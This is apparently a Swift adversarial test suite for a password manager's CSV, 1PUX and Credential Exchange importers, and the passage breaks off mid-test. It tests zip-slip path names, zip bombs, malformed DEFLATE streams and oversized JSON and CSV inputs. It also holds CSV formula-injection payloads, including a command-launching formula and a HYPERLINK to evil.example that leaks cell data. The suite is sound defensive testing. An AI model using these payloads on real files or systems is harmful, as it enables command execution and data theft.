import Foundation
import Testing
import WatchwordKit
import WatchwordMatching
import WatchwordModel
import WatchwordSync
import WatchwordTestSupport

@testable import WatchwordInterchange

/// Adversary A7 (docs/02-architecture.md §2): a crafted CSV, 1PUX or CXF file that the person is talked into
/// importing, or that a hostile app hands over through Credential Exchange. It controls every byte of the file and
/// nothing else. It must not get code execution, resource exhaustion, a scope the policy would refuse, or control
/// over which item an import writes (PRD SEC7, SEC9, F11.2; docs/04-test-plan.md §6.5).
@Suite("Adversarial: import parsers", .tags(.adversarial))
struct AdversarialInterchangeTests {
    private static let vaultID = UUID(uuidString: "5EC0FFEE-0000-4000-8000-00000000A7A7")!
    private static let note = Array(#"{"accounts":[{"vaults":[{"items":[]}]}]}"#.utf8)

    private func importArchive(_ bytes: [UInt8], limits: InterchangeLimits = .standard) throws -> ImportResult {
        var generator = SeededGenerator(seed: 7)
        return try OnePUX.importArchive(bytes, into: Self.vaultID, limits: limits, using: &generator)
    }

    private func importDocument(_ json: String, limits: InterchangeLimits = .standard) throws -> ImportResult {
        var generator = SeededGenerator(seed: 7)
        return try OnePUX.importDocument(Array(json.utf8), into: Self.vaultID, limits: limits, using: &generator)
    }

    private func importCXF(_ json: String, limits: InterchangeLimits = .standard) throws -> ImportResult {
        var generator = SeededGenerator(seed: 7)
        return try CredentialExchange.importDocument(
            Array(json.utf8), into: Self.vaultID, limits: limits, using: &generator)
    }

    private func importCSV(_ bytes: [UInt8], limits: InterchangeLimits = .standard) throws -> ImportResult {
        var generator = SeededGenerator(seed: 7)
        return try PasswordCSV.importFile(bytes, into: Self.vaultID, limits: limits, using: &generator)
    }

    private func items(_ items: String) -> String {
        #"{"accounts":[{"vaults":[{"items":["# + items + "]}]}]}"
    }

    // MARK: ZIP

    /// A7 names an archive member so that extracting it would write outside the destination ("zip-slip"). Nothing
    /// here extracts to disk, and the archive is refused all the same, even though the member read is a good one.
    @Test(
        "Zip-slip: an archive with an escaping member name is refused whole",
        arguments: [
            "../evil", "../../etc/passwd", "/etc/passwd", "a/../../b", "a/..", "..", ".", "./a", "a/./b", "a//b", "/",
            "a\\..\\b", "..\\evil", "C:\\Windows\\evil", "C:evil", "c:/evil", "a\u{0}b", "a\nb", "a\u{7F}b",
            "../\u{301}evil", "/\u{301}etc/passwd", "a/../\u{301}b", "a//\u{301}b",
            "files/\u{1B}[2J",
        ])
    func zipSlip(_ name: String) {
        let archive = ZIPFixture([
            ZIPFixture.Member(name: "export.data", contents: Self.note),
            ZIPFixture.Member(name: name, contents: [1, 2, 3]),
        ]).bytes()
        #expect(throws: InterchangeError.forbiddenEntryName(name)) { try importArchive(archive) }
        #expect(throws: InterchangeError.forbiddenEntryName(name)) { try ZIPArchive.validateEntryName(name) }
    }

    /// A7 gives a member an empty name, or one that is not UTF-8, hoping a later consumer decodes it differently.
    @Test("Zip-slip: empty and undecodable member names are refused")
    func undecodableNames() {
        var invalid = ZIPFixture.Member(name: "x", contents: [])
        invalid.name = [0x66, 0xFF, 0x2F, 0x2E, 0x2E]
        var empty = ZIPFixture.Member(name: "x", contents: [])
        empty.name = []
        for member in [invalid, empty] {
            let archive = ZIPFixture([ZIPFixture.Member(name: "export.data", contents: Self.note), member]).bytes()
            #expect {
                try importArchive(archive)
            } throws: { error in
                guard case InterchangeError.forbiddenEntryName = error else { return false }
                return true
            }
        }
    }

    /// A7 sends a decompression bomb: a member that is small in the archive and enormous once inflated.
    @Test("Zip bomb: a member beyond the 100:1 ratio is refused before and while inflating")
    func zipBomb() {
        let size = 4 * 1024 * 1024
        let bomb = DeflateFixture.zeros(count: size)
        #expect(bomb.count * 100 < size)
        // Honest about its size: refused on the declaration, before any inflating.
        let honest = ZIPFixture([
            ZIPFixture.Member(name: "export.data", contents: [UInt8](repeating: 0, count: size), data: bomb)
        ]).bytes()
        #expect(throws: InterchangeError.limitExceeded(.compressionRatio, limit: 100)) { try importArchive(honest) }
        // Lying about its size: inflating stops at the declared size, not at the end of the stream.
        let lying = ZIPFixture([
            ZIPFixture.Member(name: "export.data", contents: [], data: bomb, declaredUncompressedSize: 1_000)
        ]).bytes()
        #expect(throws: InterchangeError.malformedDeflate(.lengthMismatch)) { try importArchive(lying) }
        // And the stream on its own, with no declaration at all, stops at the ratio.
        #expect(throws: InterchangeError.limitExceeded(.compressionRatio, limit: 100)) { try Inflater.inflate(bomb) }
    }

    /// A7 declares a member of two gigabytes (or four), to make the importer reserve that much memory.
    @Test(
        "A declared size beyond the document limit is refused without allocating it",
        arguments: [0x8000_0000, 0xFFFF_FFFE])
    func declaredSize(_ declared: UInt32) {
        let archive = ZIPFixture([
            ZIPFixture.Member(
                name: "export.data", contents: [], data: DeflateFixture.stored(Self.note),
                declaredUncompressedSize: declared)
        ]).bytes()
        #expect(throws: InterchangeError.limitExceeded(.documentBytes, limit: 100 * 1024 * 1024)) {
            try importArchive(archive)
        }
    }

    /// A7 nests an archive inside the archive, each layer inflating into the next (42.zip).
    @Test("Nested archives are never opened, and a nested bomb is refused on its ratio")
    func nestedBomb() {
        let inner = ZIPFixture([
            ZIPFixture.Member(name: "export.data", contents: [UInt8](repeating: 0x41, count: 1_000_000))
        ]).bytes()
        // Within the ratio: the inner archive is read as the document it is not, and refused as text.
        let stored = ZIPFixture([ZIPFixture.Member(name: "export.data", contents: inner)]).bytes()
        #expect {
            try importArchive(stored)
        } throws: { error in
            switch error {
            case InterchangeError.invalidUTF8, InterchangeError.malformedJSON: return true
            default: return false
            }
        }
        // Beyond it: a megabyte of zeros, inflated from a few kilobytes.
        let zeros = [UInt8](repeating: 0, count: 1_000_000)
        let bomb = ZIPFixture([
            ZIPFixture.Member(name: "export.data", contents: zeros, data: DeflateFixture.zeros(count: zeros.count))
        ]).bytes()
        #expect(throws: InterchangeError.limitExceeded(.compressionRatio, limit: 100)) { try importArchive(bomb) }
    }

    /// A7 points many directory entries at one stretch of data, so the archive's contents add up to far more than
    /// its size without any single member breaking the ratio (the non-recursive zip bomb).
    @Test("Overlapping members are refused")
    func overlappingMembers() {
        var members = [ZIPFixture.Member(name: "export.data", contents: Self.note)]
        for index in 0..<8 {
            members.append(ZIPFixture.Member(name: "copy\(index)", contents: Self.note, localHeaderOffset: 0))
        }
        #expect(throws: InterchangeError.malformedArchive(.overlappingEntries)) {
            try importArchive(ZIPFixture(members).bytes())
        }
        // A member whose data would run into the central directory.
        let overrun = ZIPFixture([
            ZIPFixture.Member(name: "export.data", contents: Self.note, declaredCompressedSize: 4_000)
        ]).bytes()
        #expect(throws: (any Error).self) { try importArchive(overrun) }
    }

    /// A7 sends an archive with more members than any export has, to spend the importer's time on the directory.
    @Test("An archive with too many members is refused from its end record")
    func tooManyMembers() {
        let declared = ZIPFixture(
            [ZIPFixture.Member(name: "export.data", contents: Self.note)], declaredEntryCount: 50_001
        ).bytes()
        #expect(throws: InterchangeError.limitExceeded(.archiveEntries, limit: 50_000)) { try importArchive(declared) }
        let members = (0..<9).map { ZIPFixture.Member(name: "m\($0)", contents: []) }
        #expect(throws: InterchangeError.limitExceeded(.archiveEntries, limit: 8)) {
            try importArchive(ZIPFixture(members).bytes(), limits: InterchangeLimits(maximumArchiveEntries: 8))
        }
    }

    /// A7 uses a ZIP feature this reader does not implement, hoping it is half-implemented.
    @Test("Encrypted, ZIP64, multi-disk and unknown-compression archives are refused by name")
    func unsupportedFeatures() {
        func refusal(_ archive: ZIPFixture) -> InterchangeError? {
            do {
                _ = try importArchive(archive.bytes())
                return nil
            } catch {
                return error as? InterchangeError
            }
        }
        func member(_ change: (inout ZIPFixture.Member) -> Void) -> ZIPFixture {
            var member = ZIPFixture.Member(name: "export.data", contents: Self.note)
            change(&member)
            return ZIPFixture([member])
        }
        for flags: UInt16 in [0x0001, 0x0040, 0x2000, 0x0801, 0x2041] {
            #expect(refusal(member { $0.flags = flags }) == .unsupportedArchive(.encryption))
        }
        for flags: UInt16 in [0x0010, 0x0020, 0x1000, 0x8000] {
            #expect(refusal(member { $0.flags = flags }) == .unsupportedArchive(.flags(flags)))
        }
        for method: UInt16 in [1, 6, 9, 12, 14, 93, 95, 98, 99] {
            #expect(refusal(member { $0.method = method }) == .unsupportedArchive(.compressionMethod(method)))
        }
        // ZIP64: the extra field, the sentinel sizes, the locator, the sentinel count.
        let zip64Extra: [UInt8] = [0x01, 0x00, 0x08, 0x00] + [UInt8](repeating: 0, count: 8)
        #expect(refusal(member { $0.extra = zip64Extra }) == .unsupportedArchive(.zip64))
        #expect(refusal(member { $0.declaredUncompressedSize = 0xFFFF_FFFF }) == .unsupportedArchive(.zip64))
        #expect(refusal(member { $0.declaredCompressedSize = 0xFFFF_FFFF }) == .unsupportedArchive(.zip64))
        #expect(refusal(member { $0.localHeaderOffset = 0xFFFF_FFFF }) == .unsupportedArchive(.zip64))
        let locator: [UInt8] = [0x50, 0x4B, 0x06, 0x07] + [UInt8](repeating: 0, count: 16)
        #expect(
            refusal(ZIPFixture([ZIPFixture.Member(name: "export.data", contents: Self.note)], beforeEndRecord: locator))
                == .unsupportedArchive(.zip64))
        #expect(
            refusal(
                ZIPFixture([ZIPFixture.Member(name: "export.data", contents: Self.note)], declaredEntryCount: 0xFFFF))
                == .unsupportedArchive(.zip64))
        // Multi-disk.
        #expect(refusal(member { $0.startDisk = 1 }) == .unsupportedArchive(.multipleDisks))
        #expect(
            refusal(ZIPFixture([ZIPFixture.Member(name: "export.data", contents: Self.note)], diskNumber: 1))
                == .unsupportedArchive(.multipleDisks))
        #expect(
            refusal(ZIPFixture([ZIPFixture.Member(name: "export.data", contents: Self.note)], directoryDisk: 2))
                == .unsupportedArchive(.multipleDisks))
        // A malformed extra field is not skipped over.
        #expect(refusal(member { $0.extra = [0x55, 0x54, 0xFF, 0x00, 0x01] }) == .malformedArchive(.extraField))
        #expect(refusal(member { $0.extra = [0x55] }) == .malformedArchive(.extraField))
    }

    /// A7 makes the two copies of a member's header disagree, or names the wanted member twice, so that this reader
    /// and whatever checked the file before it see different contents.
    @Test("An archive that can be read two ways is refused")
    func ambiguousArchives() {
        func refusal(_ archive: ZIPFixture) -> InterchangeError? {
            do {
                _ = try importArchive(archive.bytes())
                return nil
            } catch {
                return error as? InterchangeError
            }
        }
        let good = ZIPFixture.Member(name: "export.data", contents: Self.note)
        #expect(refusal(ZIPFixture([good, good])) == .duplicateArchiveEntry("export.data"))
        #expect(
            refusal(ZIPFixture([ZIPFixture.Member(name: "Export.Data", contents: Self.note)]))
                == .missingArchiveEntry("export.data"))
        var renamed = good
        renamed.localName = Array("export.evil".utf8)
        #expect(refusal(ZIPFixture([renamed])) == .malformedArchive(.headerMismatch))
        var remethod = ZIPFixture.Member(
            name: "export.data", contents: Self.note, data: DeflateFixture.stored(Self.note))
        remethod.localMethod = 0
        #expect(refusal(ZIPFixture([remethod])) == .malformedArchive(.headerMismatch))
        var wrongChecksum = good
        wrongChecksum.crc = 0xDEAD_BEEF
        #expect(refusal(ZIPFixture([wrongChecksum])) == .checksumMismatch)
        var storedMismatch = good
        storedMismatch.declaredUncompressedSize = UInt32(Self.note.count + 1)
        #expect(refusal(ZIPFixture([storedMismatch])) == .malformedArchive(.sizeMismatch))
        // Bytes before the first member, a directory that is not where the end record says, counts that disagree.
        #expect(refusal(ZIPFixture([good], directoryOffsetAdjustment: 1)) == .malformedArchive(.centralDirectoryBounds))
        #expect(
            refusal(ZIPFixture([good], directoryOffsetAdjustment: -1)) == .malformedArchive(.centralDirectoryBounds))
        #expect(
            refusal(ZIPFixture([good], beforeEndRecord: [0, 0, 0, 0])) == .malformedArchive(.centralDirectoryBounds))
        #expect(
            refusal(ZIPFixture([good, ZIPFixture.Member(name: "b", contents: [])], declaredEntryCount: 1))
                == .malformedArchive(.entryCount))
        #expect(refusal(ZIPFixture([good], declaredEntryCount: 2)) == .malformedArchive(.entryCount))
        // Trailing bytes after the end record: the record no longer accounts for the end of the file.
        var trailing = ZIPFixture([good]).bytes()
        trailing += [0x00]
        #expect(throws: InterchangeError.malformedArchive(.missingEndOfCentralDirectory)) {
            try importArchive(trailing)
        }
    }

    /// A7 sends an archive cut short, or with any one byte changed. Every such file must end in a typed error or in
    /// the original contents; none may crash, hang or return something else.
    @Test("Truncated and bit-flipped archives end in a typed error or the true contents")
    func damagedArchives() throws {
        let text = Array(#"{"accounts":[{"vaults":[{"attrs":{"name":"V"},"items":[]}]}]}"#.utf8)
        let archive = ZIPFixture([
            ZIPFixture.Member(name: "export.attributes", contents: Array("{}".utf8)),
            ZIPFixture.Member(
                name: "export.data", contents: text, data: DeflateFixture.stored(text), usesDataDescriptor: true),
        ]).bytes()
        #expect(try ZIPArchive(archive).contents(of: "export.data") == text)
        for length in 0..<archive.count {
            #expect(throws: InterchangeError.self, "prefix of \(length)") {
                try ZIPArchive(Array(archive[..<length])).contents(of: "export.data")
            }
        }
        for index in archive.indices {
            for mask: UInt8 in [0x01, 0x80, 0xFF] {
                var damaged = archive
                damaged[index] ^= mask
                do {
                    let contents = try ZIPArchive(damaged).contents(of: "export.data")
                    #expect(contents == text, "byte \(index) ^ \(mask)")
                } catch is InterchangeError {
                    continue
                } catch {
                    Issue.record("byte \(index): untyped error \(error)")
                }
            }
        }
    }

    // MARK: DEFLATE

    /// A7 hand-assembles a DEFLATE stream no compressor would write, aiming at the inflater's table building and
    /// back-references.
    @Test("Malformed DEFLATE streams are refused, each for its own reason")
    func malformedDeflate() {
        func stream(_ build: (inout DeflateFixture) -> Void) -> [UInt8] {
            var fixture = DeflateFixture()
            build(&fixture)
            return fixture.bytes
        }
        func defect(_ bytes: [UInt8]) -> DeflateDefect? {
            do {
                _ = try Inflater.inflate(bytes)
                return nil
            } catch InterchangeError.malformedDeflate(let defect) {
                return defect
            } catch {
                return nil
            }
        }
        #expect(defect([]) == .truncated)
        #expect(defect([0x07]) == .reservedBlockType)
        #expect(defect([0x01, 0x05, 0x00, 0x00, 0x00]) == .storedLengthMismatch)
        #expect(defect([0x01, 0x05, 0x00, 0xFA, 0xFF, 0x61]) == .truncated)
        #expect(defect([0x00, 0x00, 0x00, 0xFF, 0xFF]) == .truncated)
        #expect(defect([0x01, 0x00, 0x00, 0xFF, 0xFF, 0x00]) == .trailingData)

        // A match before any output exists.
        let early = stream {
            $0.append(bits: 0b011, count: 3)
            $0.append(code: 0b000_0001, length: 7)
            $0.append(code: 0, length: 5)
            $0.append(code: 0, length: 7)
        }
        #expect(defect(early) == .distanceTooFar)
        // Literal/length symbol 286, which the fixed code can spell and no block may use.
        let reserved = stream {
            $0.append(bits: 0b011, count: 3)
            $0.append(code: 0b1100_0110, length: 8)
            $0.append(code: 0, length: 7)
        }
        #expect(defect(reserved) == .invalidSymbol)
        // Distance symbol 30.
        let farSymbol = stream {
            $0.append(bits: 0b011, count: 3)
            $0.append(code: 0b1001_0001, length: 8)
            $0.append(code: 0b000_0001, length: 7)
            $0.append(code: 0b11110, length: 5)
            $0.append(code: 0, length: 7)
        }
        #expect(defect(farSymbol) == .invalidSymbol)

        func dynamic(
            literals: UInt32 = 0, distances: UInt32 = 0, codeLengths: [UInt32],
            _ body: (inout DeflateFixture) -> Void = { _ in }
        ) -> [UInt8] {
            stream {
                $0.append(bits: 0b101, count: 3)
                $0.append(bits: literals, count: 5)
                $0.append(bits: distances, count: 5)
                $0.append(bits: UInt32(codeLengths.count - 4), count: 4)
                for length in codeLengths {
                    $0.append(bits: length, count: 3)
                }
                body(&$0)
            }
        }
        // More literal/length codes than exist.
        #expect(defect(dynamic(literals: 30, codeLengths: [1, 0, 0, 1])) == .invalidCodeLengths)
        // No code-length code at all, an incomplete one, an over-subscribed one.
        #expect(defect(dynamic(codeLengths: [0, 0, 0, 0])) == .invalidCodeLengths)
        #expect(defect(dynamic(codeLengths: [1, 0, 0, 0])) == .invalidCodeLengths)
        #expect(defect(dynamic(codeLengths: [1, 1, 1, 0])) == .invalidCodeLengths)
        // Code lengths are sent in the order 16, 17, 18, 0: here 16 and 0 have one-bit codes (0 is `0`, 16 is `1`).
        // "Repeat the previous length" with no previous length.
        #expect(defect(dynamic(codeLengths: [1, 0, 0, 1]) { $0.append(code: 1, length: 1) }) == .invalidCodeLengths)
        // Here 18 and 0 have the one-bit codes (0 is `0`, 18 is `1`): runs of zeros.
        let zeroRuns = { (runs: [UInt32]) in
            dynamic(codeLengths: [0, 0, 1, 1]) { fixture in
                for run in runs {
                    fixture.append(code: 1, length: 1)
                    fixture.append(bits: run - 11, count: 7)
                }
            }
        }
        // 258 lengths, all zero: no way to end a block.
        #expect(defect(zeroRuns([138, 120])) == .missingEndOfBlock)
        // A run that overshoots the 258 lengths the header promised.
        #expect(defect(zeroRuns([138, 138])) == .invalidCodeLengths)
    }

    /// A7 cuts a valid stream short or flips its bits; whatever is left must inflate to the truth or be refused.
    @Test("Damaged DEFLATE streams never crash and never run past their caps")
    func damagedDeflate() throws {
        let plain = Array(String(repeating: "abcabcabd", count: 40).utf8)
        let fixed = DeflateFixture.zeros(count: 5_000)
        for stream in [DeflateFixture.stored(plain), fixed] {
            for length in 0..<stream.count {
                #expect(throws: InterchangeError.self) { try Inflater.inflate(Array(stream[..<length])) }
            }
        }
        var generator = SeededGenerator(seed: TestEnvironment.seed(fallback: 0xDEF1A7E))
        let limits = InterchangeLimits(maximumDocumentBytes: 1 << 16)
        for _ in 0..<TestEnvironment.iterations(standard: 3_000, long: 300_000) {
            var bytes: [UInt8]
            if Bool.random(using: &generator) {
                bytes = fixed
                for _ in 0..<Int.random(in: 1...3, using: &generator) {
                    bytes[Int.random(in: bytes.indices, using: &generator)] = UInt8.random(
                        in: 0...255, using: &generator)
                }
            } else {
                // Random bytes behind each of the three block-type headers.
                bytes = (0..<Int.random(in: 0...64, using: &generator)).map { _ in
                    UInt8.random(in: 0...255, using: &generator)
                }
                if !bytes.isEmpty { bytes[0] = (bytes[0] & 0xF8) | UInt8.random(in: 0...5, using: &generator) }
            }
            do {
                let output = try Inflater.inflate(bytes, limits: limits)
                #expect(output.count <= 1 << 16)
                #expect(output.count <= bytes.count * 100)
            } catch is InterchangeError {
                continue
            } catch {
                Issue.record("untyped error \(error)")
            }
        }
    }

    // MARK: CSV

    /// A7 plants a spreadsheet formula in a field, so that the plaintext export of the vault runs it when the
    /// person opens the file in a spreadsheet (CSV injection). Export makes such cells inert; import keeps them.
    @Test("CSV formula injection: import preserves the cell as data, export makes it inert")
    func formulaInjection() throws {
        let payloads = [
            "=cmd|' /C calc'!A0", "+1+1", "-2+3", "@SUM(1+1)*cmd|' /C calc'!A0", "\t=1+1",
            "=HYPERLINK(\"http://evil.example?x=\"&A1)",
        ]
        var csv = "Title,URL,Username,Password,Notes,OTPAuth\r\n"
        for (index, payload) in payloads.enumerated() {
            let cell = "\"" + payload.replacingOccurrences(of: "\"", with: "\"\"") + "\""
            csv += "\(cell),https://site\(index).example/,\(cell),\(cell),\(cell),\r\n"
        }
        let imported = try importCSV(Array(csv.utf8))
        #expect(imported.entries.count == payloads.count)
        for (entry, payload) in zip(imported.entries, payloads) {
            #expect(entry.item.title == payload.trimmingCharacters(in: .whitespacesAndNewlines))
            #expect(entry.item.fields.first { $0.kind == .username }?.value == payload)
            #expect(entry.item.fields.first { $0.kind == .password }?.value == payload)
            #expect(entry.item.notes == payload)
        }
        // Exported, no cell begins with a character a spreadsheet would act on.
        let exported = PasswordCSV.exportApplePasswords(imported.entries.map(\.item))
        let rows = try CSVReader.parse(exported.bytes)
        #expect(rows.count == payloads.count + 1)
        for row in rows.dropFirst() {
            for cell in row.fields {
                #expect(!CSVWriter.isFormulaLike(cell), "\(cell)")
            }
            #expect(row.fields[3].hasPrefix("'"))
        }
        #expect(exported.report.warnings.count >= payloads.count * 3)
        // 1PUX and CXF exports are JSON, where nothing is evaluated: the values are written unchanged.
        let json = CredentialExchange.exportDocument(
            imported.entries.map(\.item),
            options: CredentialExchange.ExportOptions(
                exporterRelyingPartyID: "watchword.example", accountID: Self.vaultID,
                timestamp: Date(timeIntervalSince1970: 0)))
        #expect(String(decoding: json.bytes, as: UTF8.self).contains(#""value":"+1+1""#))
    }

    /// A7 hides record structure inside quoted cells, hoping a naive reader splits on the line breaks.
    @Test("CSV: embedded newlines, quotes and commas stay inside their cell")
    func embeddedStructure() throws {
        let csv =
            "Title,URL,Username,Password\r\n\"Bank\r\nEvil,https://evil.example,admin,stolen\",https://bank.example/,\"a\"\"b\",\"p,q\r\nr\"\r\n"
        let result = try importCSV(Array(csv.utf8))
        #expect(result.entries.count == 1)
        let item = try #require(result.entries.first?.item)
        #expect(item.title == "Bank\r\nEvil,https://evil.example,admin,stolen")
        #expect(item.scopes.map(\.host) == ["bank.example"])
        #expect(item.fields.first { $0.kind == .username }?.value == "a\"b")
        #expect(item.fields.first { $0.kind == .password }?.value == "p,q\r\nr")
    }

    /// A7 supplies bytes that are not UTF-8, so that a repairing decoder silently changes a password, or text in
    /// another encoding that decodes to something else.
    @Test("Invalid UTF-8 and UTF-16 input is refused, never repaired")
    func invalidText() {
        let header = Array("Title,URL,Username,Password\n".utf8)
        #expect(throws: InterchangeError.invalidUTF8(byteOffset: header.count + 2)) {
            try importCSV(header + [0x61, 0x2C, 0xC3, 0x28, 0x2C, 0x2C, 0x0A])
        }
        #expect(throws: InterchangeError.invalidUTF8(byteOffset: 0)) { try importCSV([0xED, 0xA0, 0x80]) }
        #expect(throws: InterchangeError.unsupportedTextEncoding) { try importCSV([0xFF, 0xFE] + header) }
        #expect(throws: InterchangeError.unsupportedTextEncoding) { try importCSV([0xFE, 0xFF] + header) }
        let invalid: [UInt8] = Array(#"{"accounts":[{"vaults":[{"items":[{"overview":{"title":""#.utf8) + [0xC0, 0xAF]
        var generator = SeededGenerator(seed: 7)
        #expect(throws: InterchangeError.invalidUTF8(byteOffset: invalid.count - 2)) {
            try OnePUX.importDocument(invalid, into: Self.vaultID, using: &generator)
        }
        #expect(throws: InterchangeError.invalidUTF8(byteOffset: invalid.count - 2)) {
            try CredentialExchange.importDocument(invalid, into: Self.vaultID, using: &generator)
        }
    }

    /// A7 puts a byte-order mark in front of the header so that the first column's name no longer matches.
    @Test("A UTF-8 byte-order mark does not hide the first column")
    func byteOrderMark() throws {
        let csv =
            [0xEF, 0xBB, 0xBF]
            + Array("Title,URL,Username,Password,Notes,OTPAuth\nSite,https://example.com,u,p,,\n".utf8)
        let result = try importCSV(csv)
        #expect(result.report.format == .applePasswordsCSV)
        #expect(result.entries.first?.item.title == "Site")
        // A mark anywhere else is data.
        let inner = try importCSV(Array("Title,URL,Username,Password\n\u{FEFF}Site,https://example.com,u,p\n".utf8))
        #expect(inner.entries.first?.item.title == "\u{FEFF}Site")
    }

    /// A7 sends a row, a cell, a column count or a row count far beyond any real export, to exhaust memory.
    @Test("CSV: oversized rows, cells, column counts and row counts stop at their limits")
    func oversizedCSV() {
        let header = "Title,URL,Username,Password\n"
        // A quote that never closes would otherwise swallow the rest of the file into one cell.
        let unterminated = Array((header + "x,y,z,\"" + String(repeating: "A", count: 600_000)).utf8)
        #expect(throws: InterchangeError.limitExceeded(.fieldBytes, limit: 256 * 1024)) { try importCSV(unterminated) }
        let longRow = Array((header + String(repeating: "abcdefghi,", count: 60_000) + "\n").utf8)
        #expect(throws: InterchangeError.limitExceeded(.csvColumns, limit: 100)) { try importCSV(longRow) }
        let wideRow = Array(
            (header + String(repeating: String(repeating: "a", count: 200_000) + ",", count: 3) + "\n").utf8)
        #expect(throws: InterchangeError.limitExceeded(.entryBytes, limit: 512 * 1024)) { try importCSV(wideRow) }
        let manyRows = Array((header + String(repeating: "t,https://example.com,u,p\n", count: 50_001)).utf8)
        #expect(throws: InterchangeError.limitExceeded(.items, limit: 50_000)) { try importCSV(manyRows) }
        let limits = InterchangeLimits(maximumInputBytes: 64)
        #expect(throws: InterchangeError.limitExceeded(.inputBytes, limit: 64)) {
            try importCSV(Array((header + String(repeating: "a", count: 64)).utf8), limits: limits)
        }
    }

    /// A7 hands over a file larger than any export, relying on the importer to read it before judging it.
    @Test("A file over 100 MB is refused before it is parsed, in every format")
    func oversizedFile() {
        let huge = [UInt8](repeating: UInt8(ascii: "a"), count: 100 * 1024 * 1024 + 1)
        let expected = InterchangeError.limitExceeded(.inputBytes, limit: 100 * 1024 * 1024)
        var generator = SeededGenerator(seed: 7)
        #expect(throws: expected) { try importCSV(huge) }
        #expect(throws: expected) { try importArchive(huge) }
        #expect(throws: expected) { try CredentialExchange.importDocument(huge, into: Self.vaultID, using: &generator) }
        #expect(throws: expected) { try Inflater.inflate(huge) }
        #expect(throws: InterchangeError.limitExceeded(.documentBytes, limit: 100 * 1024 * 1024)) {
            try OnePUX.importDocument(huge, into: Self.vaultID, using: &generator)
        }
    }

    // MARK: 1PUX and CXF documents

    /// A7 sends a 1PUX export of a million items, to exhaust memory or time.
    @Test("1PUX with 10^6 items stops at the item limit")
    func millionItems() {
        let document = items(String(repeating: "{},", count: 999_999) + "{}")
        #expect(throws: InterchangeError.limitExceeded(.items, limit: 50_000)) { try importDocument(document) }
        // The same bound holds for accounts and vaults, which are also only array elements.
        let vaults = #"{"accounts":[{"vaults":["# + String(repeating: #"{"items":[]},"#, count: 60_000) + #"{}]}]}"#
        #expect(throws: InterchangeError.limitExceeded(.items, limit: 50_000)) { try importDocument(vaults) }
        let cxf =
            #"{"version":{"major":1,"minor":0},"accounts":[{"items":["# + String(repeating: "0,", count: 60_000)
            + "0]}]}"
        #expect(throws: InterchangeError.limitExceeded(.items, limit: 50_000)) { try importCXF(cxf) }
    }

    /// A7 nests arrays tens of thousands deep, to overflow the stack of a recursive parser.
    @Test("Deeply nested JSON is refused at the depth limit, wherever it sits")
    func deepNesting() {
        let deep = String(repeating: "[", count: 200_000)
        let expected = InterchangeError.limitExceeded(.nestingDepth, limit: 64)
        // Where the format expects an object, an array is refused for what it is before its depth matters.
        #expect(throws: InterchangeError.unexpectedStructure(path: "$")) { try importDocument(deep) }
        #expect(throws: InterchangeError.unexpectedStructure(path: "accounts[]")) {
            try importDocument(#"{"accounts":"# + deep)
        }
        #expect(throws: expected) { try importDocument(#"{"accounts":[{"vaults":[{"attrs":"# + deep) }
        #expect(throws: expected) { try importDocument(#"{"ignored":"# + String(repeating: #"{"a":"#, count: 200_000)) }
        #expect(throws: expected) { try importDocument(items(#"{"details":"# + deep)) }
        #expect(throws: expected) { try importCXF(#"{"version":"# + deep) }
        #expect(throws: expected) { try importCXF(#"{"accounts":[{"items":[{"credentials":"# + deep) }
    }

    /// A7 pads one item with megabytes of text or thousands of fields, to bloat the vault or exhaust memory.
    @Test("An oversized item is skipped and listed; its neighbours are imported")
    func oversizedItems() throws {
        let good = #"{"uuid":"g","categoryUuid":"003","overview":{"title":"Good"},"details":{"notesPlain":"n"}}"#
        let hugeNote =
            #"{"uuid":"h","overview":{"title":"Huge"},"details":{"notesPlain":""#
            + String(repeating: "A", count: 600_000) + #""}}"#
        let longField =
            #"{"uuid":"l","overview":{"title":"Long"},"details":{"notesPlain":""#
            + String(repeating: "A", count: 300_000) + #""}}"#
        let field = #"{"title":"t","id":"i","value":{"string":"v"}},"#
        let manyFields =
            #"{"uuid":"m","overview":{"title":"Many"},"details":{"sections":[{"title":"","fields":["#
            + String(repeating: field, count: 1_001).dropLast() + "]}]}}"
        let result = try importDocument(items([hugeNote, good, longField, manyFields].joined(separator: ",")))
        #expect(result.entries.map(\.item.title) == ["Good"])
        #expect(
            result.report.skipped.map(\.reason) == [
                .tooLarge(.entryBytes, limit: 512 * 1024), .tooLarge(.fieldBytes, limit: 256 * 1024),
                .tooLarge(.fieldsPerItem, limit: 1_000),
            ])
        #expect(result.report.skipped.map(\.entry.index) == [1, 3, 4])
        #expect(result.report.skipped.map(\.entry.title) == ["", "Long", "Many"])
    }

    /// A7 earns a warning with every few bytes (a one-label URL is refused as a scope), so that the report of a
    /// modest file is far larger than the file.
    @Test("The report's warnings are capped, and the overflow is counted")
    func warningFlood() throws {
        // Thirty-two URLs of an entry are considered, and each refusal is a warning; the rest earn one between them.
        let entries = (0..<320).map { entry -> String in
            let urls = (0..<40).map { #"{"url":"h\#(entry)x\#($0)"}"# }.joined(separator: ",")
            return #"{"uuid":"u\#(entry)","overview":{"title":"T\#(entry)","urls":[\#(urls)]},"details":{}}"#
        }
        let result = try importDocument(items(entries.joined(separator: ",")))
        #expect(result.entries.count == 320)
        #expect(result.entries.allSatisfy { $0.item.scopes.isEmpty && $0.item.fields.count == 40 })
        #expect(result.report.warnings.count == ImportReport.maximumWarnings)
        #expect(result.report.omittedWarningCount == 320 * 33 - ImportReport.maximumWarnings)
        // A URL listed a thousand times is one field and one warning.
        let repeated = (0..<999).map { _ in #"{"url":"intranet"}"# }.joined(separator: ",")
        let once = try importDocument(
            items(#"{"uuid":"r","overview":{"title":"R","urls":[\#(repeated)]},"details":{}}"#))
        #expect(once.entries.first?.item.fields.count == 1)
        #expect(once.report.warnings.count == 1)
    }

    // MARK: Amplification

    /// A7 keeps every one of the per-file, per-entry and per-count limits and spends their product: rows of a
    /// hundred two-byte cells are a megabyte of file for every half million `Field`s, and 100 MB of them is
    /// gigabytes of drafts, which on a phone is the app killed (PRD SEC7). The import as a whole has a budget.
    @Test("A file inside every per-entry limit cannot expand into more than a million fields")
    func aggregateFields() throws {
        let header = "Title,Password," + Array(repeating: "x", count: 98).joined(separator: ",") + "\n"
        let row = Array(repeating: "a", count: 100).joined(separator: ",") + "\n"
        // Ninety-nine fields a row: 10,101 rows are 999,999 fields, and the next row is refused before it is built.
        let fits = try importCSV(Array((header + String(repeating: row, count: 10_101)).utf8))
        #expect(fits.entries.count == 10_101)
        #expect(fits.entries.reduce(0) { $0 + $1.item.fields.count } == 999_999)
        #expect(throws: InterchangeError.limitExceeded(.totalFields, limit: 1_000_000)) {
